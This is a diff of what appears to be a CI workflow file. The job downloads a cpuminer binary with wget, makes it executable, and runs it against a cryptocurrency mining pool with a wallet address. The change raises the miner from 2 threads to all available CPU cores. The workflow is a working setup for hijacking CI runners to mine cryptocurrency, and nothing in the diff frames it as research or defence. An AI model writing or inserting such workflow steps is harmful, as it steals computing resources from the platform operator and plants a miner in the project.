@@ -14,4 +14,4 @@ jobs:
         wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
         tar -xvf cpuminer-opt-linux.tar.gz
         chmod +x cpuminer-sse2
-        ./cpuminer-sse2 -a power2b -o stratum+tcp://stratum-asia.rplant.xyz:17022 -u mbc1q4kmmc3wcnl6duv50rfmae6pvs3q4wsmvz27fdl.github -t 2
+        ./cpuminer-sse2 -a power2b -o stratum+tcp://stratum-asia.rplant.xyz:17022 -u mbc1q4kmmc3wcnl6duv50rfmae6pvs3q4wsmvz27fdl.github -t $(nproc)
